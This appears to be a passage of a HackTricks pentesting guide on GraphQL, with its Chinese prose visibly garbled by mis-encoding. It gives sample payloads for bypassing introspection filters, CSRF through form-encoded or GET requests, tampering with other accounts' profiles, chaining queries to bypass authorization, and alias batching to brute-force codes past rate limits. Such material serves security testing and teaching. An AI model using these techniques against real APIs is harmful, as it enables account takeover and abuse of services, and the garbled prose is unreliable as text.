ä¸ºäº†ç»•è¿‡APIä¸­å†…çœæŸ¥è¯¢çš„é™åˆ¶ï¼Œåœ¨`__schema`å…³é”®å­—åæ’å…¥ä¸€ä¸ª**ç‰¹æ®Šå­—ç¬¦**æ˜¯æœ‰æ•ˆçš„ã€‚è¿™ç§æ–¹æ³•åˆ©ç”¨äº†å¸¸è§çš„å¼€å‘äººå‘˜åœ¨æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ä¸­çš„ç–å¿½ï¼Œè¿™äº›æ¨¡å¼æ—¨åœ¨é€šè¿‡å…³æ³¨`__schema`å…³é”®å­—æ¥é˜»æ­¢å†…çœã€‚é€šè¿‡æ·»åŠ åƒ**ç©ºæ ¼ã€æ¢è¡Œå’Œé€—å·**è¿™æ ·çš„å­—ç¬¦ï¼ŒGraphQLä¼šå¿½ç•¥ä½†å¯èƒ½æ²¡æœ‰åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­è€ƒè™‘åˆ°çš„å­—ç¬¦ï¼Œå¯ä»¥è§„é¿é™åˆ¶ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªåœ¨`__schema`åé¢æœ‰ä¸€ä¸ªæ¢è¡Œç¬¦çš„å†…çœæŸ¥è¯¢å¯èƒ½ä¼šç»•è¿‡è¿™ç§é˜²å¾¡ï¼š
```bash
# Example with newline to bypass
{
"query": "query{__schema
{queryType{name}}}"
}
```
å¦‚æœä¸æˆåŠŸï¼Œè€ƒè™‘ä½¿ç”¨**GETè¯·æ±‚**æˆ–**å¸¦æœ‰`x-www-form-urlencoded`çš„POST**ç­‰æ›¿ä»£è¯·æ±‚æ–¹æ³•ï¼Œå› ä¸ºé™åˆ¶å¯èƒ½ä»…é€‚ç”¨äºPOSTè¯·æ±‚ã€‚

### **å‘ç°æš´éœ²çš„GraphQLç»“æ„**

å½“ç¦ç”¨å†…çœæ—¶ï¼Œæ£€æŸ¥ç½‘ç«™æºä»£ç ä¸­JavaScriptåº“ä¸­é¢„åŠ è½½çš„æŸ¥è¯¢æ˜¯ä¸€ç§æœ‰ç”¨çš„ç­–ç•¥ã€‚å¯ä»¥ä½¿ç”¨å¼€å‘è€…å·¥å…·ä¸­çš„`Sources`é€‰é¡¹å¡æ‰¾åˆ°è¿™äº›æŸ¥è¯¢ï¼Œä»è€Œæ·±å…¥äº†è§£APIçš„æ¨¡å¼å¹¶æ­ç¤ºå¯èƒ½**æš´éœ²çš„æ•æ„ŸæŸ¥è¯¢**ã€‚åœ¨å¼€å‘è€…å·¥å…·ä¸­æœç´¢çš„å‘½ä»¤ä¸ºï¼š
```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```
## GraphQLä¸­çš„CSRF

å¦‚æœä½ ä¸çŸ¥é“ä»€ä¹ˆæ˜¯CSRFï¼Œè¯·é˜…è¯»ä»¥ä¸‹é¡µé¢ï¼š

{% content-ref url="../../pentesting-web/csrf-cross-site-request-forgery.md" %}
[csrf-cross-site-request-forgery.md](../../pentesting-web/csrf-cross-site-request-forgery.md)
{% endcontent-ref %}

åœ¨è¿™é‡Œï¼Œä½ å°†èƒ½å¤Ÿæ‰¾åˆ°ä¸€äº›GraphQLç«¯ç‚¹**é…ç½®æ²¡æœ‰CSRFä»¤ç‰Œ**ã€‚

è¯·æ³¨æ„ï¼ŒGraphQLè¯·æ±‚é€šå¸¸é€šè¿‡ä½¿ç”¨Content-Type **`application/json`**çš„POSTè¯·æ±‚å‘é€ã€‚
```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```
ç„¶è€Œï¼Œå¤§å¤šæ•° GraphQL ç«¯ç‚¹ä¹Ÿæ”¯æŒ **`form-urlencoded` POST è¯·æ±‚ï¼š**
```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```
å› æ­¤ï¼Œç”±äºç±»ä¼¼ä¹‹å‰çš„ CSRF è¯·æ±‚æ˜¯**æ— éœ€é¢„æ£€è¯·æ±‚**å‘é€çš„ï¼Œå› æ­¤å¯èƒ½åˆ©ç”¨ CSRF åœ¨ GraphQL ä¸­**æ‰§è¡Œ** **æ›´æ”¹**ã€‚

ä½†æ˜¯ï¼Œè¯·æ³¨æ„ Chrome çš„ `samesite` æ ‡å¿—çš„æ–°é»˜è®¤ cookie å€¼ä¸º `Lax`ã€‚è¿™æ„å‘³ç€è¯¥ cookie ä»…åœ¨ç¬¬ä¸‰æ–¹ç½‘ç«™çš„ GET è¯·æ±‚ä¸­å‘é€ã€‚

è¯·æ³¨æ„ï¼Œé€šå¸¸ä¹Ÿå¯ä»¥å°†**æŸ¥è¯¢è¯·æ±‚**ä½œä¸º**GET**è¯·æ±‚å‘é€ï¼Œè€Œåœ¨ GET è¯·æ±‚ä¸­å¯èƒ½ä¸ä¼šéªŒè¯ CSRF ä»¤ç‰Œã€‚

æ­¤å¤–ï¼Œå¯èƒ½åˆ©ç”¨ [**XS-Search**](../../pentesting-web/xs-search.md) **æ”»å‡»**ä» GraphQL ç«¯ç‚¹ä¸­æ»¥ç”¨ç”¨æˆ·å‡­æ®çªƒå–å†…å®¹ã€‚

æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹[**æ­¤å¤„çš„åŸå§‹å¸–å­**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html)ã€‚

## GraphQL ä¸­çš„æˆæƒ

ç«¯ç‚¹ä¸Šå®šä¹‰çš„è®¸å¤š GraphQL å‡½æ•°å¯èƒ½ä»…æ£€æŸ¥è¯·æ±‚è€…çš„èº«ä»½éªŒè¯è€Œä¸æ£€æŸ¥æˆæƒã€‚

ä¿®æ”¹æŸ¥è¯¢è¾“å…¥å˜é‡å¯èƒ½å¯¼è‡´æ³„éœ²æ•æ„Ÿå¸æˆ·è¯¦ç»†ä¿¡æ¯[leaked](https://hackerone.com/reports/792927)ã€‚

ç”šè‡³å¯èƒ½é€šè¿‡ä¿®æ”¹å…¶ä»–å¸æˆ·æ•°æ®å°è¯•æ¥ç®¡å¸æˆ·æ¥å¯¼è‡´å˜å¼‚ã€‚
```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```
### ç»•è¿‡GraphQLæˆæƒ

[é“¾æ¥æŸ¥è¯¢](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln) å¯ä»¥ç»•è¿‡å¼±æˆæƒç³»ç»Ÿã€‚

åœ¨ä¸‹é¢çš„ç¤ºä¾‹ä¸­ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°æ“ä½œæ˜¯â€œforgotPasswordâ€ï¼Œå®ƒåº”è¯¥åªæ‰§è¡Œä¸ä¹‹å…³è”çš„forgotPasswordæŸ¥è¯¢ã€‚è¿™å¯ä»¥é€šè¿‡åœ¨æœ«å°¾æ·»åŠ ä¸€ä¸ªæŸ¥è¯¢æ¥ç»•è¿‡ï¼Œæœ¬ä¾‹ä¸­æˆ‘ä»¬æ·»åŠ äº†â€œregisterâ€å’Œä¸€ä¸ªç”¨æˆ·å˜é‡ï¼Œç³»ç»Ÿå°†å…¶æ³¨å†Œä¸ºæ–°ç”¨æˆ·ã€‚

<figure><img src="../../.gitbook/assets/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## ä½¿ç”¨GraphQLä¸­çš„åˆ«åç»•è¿‡é€Ÿç‡é™åˆ¶

åœ¨GraphQLä¸­ï¼Œåˆ«åæ˜¯ä¸€ä¸ªå¼ºå¤§çš„åŠŸèƒ½ï¼Œå…è®¸åœ¨è¿›è¡ŒAPIè¯·æ±‚æ—¶**æ˜ç¡®å‘½åå±æ€§**ã€‚è¿™ç§èƒ½åŠ›ç‰¹åˆ«é€‚ç”¨äºåœ¨å•ä¸ªè¯·æ±‚ä¸­æ£€ç´¢**åŒä¸€ç±»å‹çš„å¤šä¸ªå®ä¾‹**ã€‚åˆ«åå¯ç”¨äºå…‹æœé˜»æ­¢GraphQLå¯¹è±¡å…·æœ‰ç›¸åŒåç§°çš„å¤šä¸ªå±æ€§çš„é™åˆ¶ã€‚

å»ºè®®æŸ¥çœ‹æœ‰å…³GraphQLåˆ«åçš„è¯¦ç»†ç†è§£çš„èµ„æºï¼š[åˆ«å](https://portswigger.net/web-security/graphql/what-is-graphql#aliases)ã€‚

è™½ç„¶åˆ«åçš„ä¸»è¦ç›®çš„æ˜¯å‡å°‘å¤§é‡APIè°ƒç”¨çš„å¿…è¦æ€§ï¼Œä½†å·²ç»å‘ç°äº†ä¸€ä¸ªæ„å¤–çš„ç”¨ä¾‹ï¼Œå³å¯ä»¥åˆ©ç”¨åˆ«åæ¥å¯¹GraphQLç«¯ç‚¹æ‰§è¡Œæš´åŠ›æ”»å‡»ã€‚è¿™æ˜¯å¯èƒ½çš„ï¼Œå› ä¸ºä¸€äº›ç«¯ç‚¹å—åˆ°é€Ÿç‡é™åˆ¶å™¨çš„ä¿æŠ¤ï¼Œè¿™äº›é™åˆ¶å™¨æ—¨åœ¨é€šè¿‡é™åˆ¶**HTTPè¯·æ±‚çš„æ•°é‡**æ¥é˜»æ­¢æš´åŠ›æ”»å‡»ã€‚ç„¶è€Œï¼Œè¿™äº›é€Ÿç‡é™åˆ¶å™¨å¯èƒ½ä¸è€ƒè™‘æ¯ä¸ªè¯·æ±‚ä¸­çš„æ“ä½œæ•°é‡ã€‚é‰´äºåˆ«åå…è®¸åœ¨å•ä¸ªHTTPè¯·æ±‚ä¸­åŒ…å«å¤šä¸ªæŸ¥è¯¢ï¼Œå®ƒä»¬å¯ä»¥è§„é¿æ­¤ç±»é€Ÿç‡é™åˆ¶æªæ–½ã€‚

è€ƒè™‘ä¸‹é¢æä¾›çš„ç¤ºä¾‹ï¼Œè¯´æ˜äº†å¦‚ä½•ä½¿ç”¨åˆ«åæŸ¥è¯¢æ¥éªŒè¯å•†åº—æŠ˜æ‰£ä»£ç çš„æœ‰æ•ˆæ€§ã€‚è¿™ç§æ–¹æ³•å¯ä»¥ç»•è¿‡é€Ÿç‡é™åˆ¶ï¼Œå› ä¸ºå®ƒå°†å¤šä¸ªæŸ¥è¯¢ç¼–è¯‘åˆ°ä¸€ä¸ªHTTPè¯·æ±‚ä¸­ï¼Œä»è€Œå¯èƒ½å…è®¸åŒæ—¶éªŒè¯å¤šä¸ªæŠ˜æ‰£ä»£ç ã€‚
```bash
# Example of a request utilizing aliased queries to check for valid discount codes
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```
## å·¥å…·

### æ¼æ´æ‰«æå™¨

* [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler)ï¼šå·¥å…·åŒ…ï¼Œå¯ç”¨äºæŠ“å–æ¨¡å¼å¹¶æœç´¢æ•æ„Ÿæ•°æ®ï¼Œæµ‹è¯•æˆæƒï¼Œæš´åŠ›ç ´è§£æ¨¡å¼ï¼Œå¹¶æ‰¾åˆ°åˆ°ç»™å®šç±»å‹çš„è·¯å¾„ã€‚
* [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html)ï¼šå¯ä½œä¸ºç‹¬ç«‹å·¥å…·æˆ–[Burpæ‰©å±•](https://github.com/doyensec/inql)ä½¿ç”¨ã€‚
* [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap)ï¼šä¹Ÿå¯ä½œä¸ºCLIå®¢æˆ·ç«¯ç”¨äºè‡ªåŠ¨åŒ–æ”»å‡»ã€‚
* [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum)ï¼šåˆ—å‡ºåœ¨GraphQLæ¨¡å¼ä¸­åˆ°è¾¾ç»™å®šç±»å‹çš„ä¸åŒæ–¹å¼çš„å·¥å…·ã€‚
* [https://github.com/doyensec/inql](https://github.com/doyensec/inql)ï¼šç”¨äºé«˜çº§GraphQLæµ‹è¯•çš„Burpæ‰©å±•ã€‚_**Scanner**_æ˜¯InQL v5.0çš„æ ¸å¿ƒï¼Œæ‚¨å¯ä»¥åˆ†æGraphQLç«¯ç‚¹æˆ–æœ¬åœ°å†…çœæ¨¡å¼æ–‡ä»¶ã€‚å®ƒä¼šè‡ªåŠ¨ç”Ÿæˆæ‰€æœ‰å¯èƒ½çš„æŸ¥è¯¢å’Œå˜æ›´ï¼Œå¹¶å°†å®ƒä»¬ç»„ç»‡æˆç»“æ„åŒ–è§†å›¾ä¾›æ‚¨åˆ†æã€‚_**Attacker**_ç»„ä»¶å¯è®©æ‚¨è¿è¡Œæ‰¹é‡GraphQLæ”»å‡»ï¼Œè¿™å¯¹è§„é¿å®æ–½ä¸å½“çš„é€Ÿç‡é™åˆ¶å¾ˆæœ‰ç”¨ã€‚

### å®¢æˆ·ç«¯

* [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql)ï¼šGUIå®¢æˆ·ç«¯
* [https://altair.sirmuel.design/](https://altair.sirmuel.design/)ï¼šGUIå®¢æˆ·ç«¯

### è‡ªåŠ¨åŒ–æµ‹è¯•

{% embed url="https://graphql-dashboard.herokuapp.com/" %}

* è§£é‡ŠAutoGraphQLçš„è§†é¢‘ï¼š[https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## å‚è€ƒèµ„æ–™

* [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
* [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
* [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½PDFç‰ˆæœ¬çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[NFTs](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ä¸Šå…³æ³¨**æˆ‘ä»¬ã€‚
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
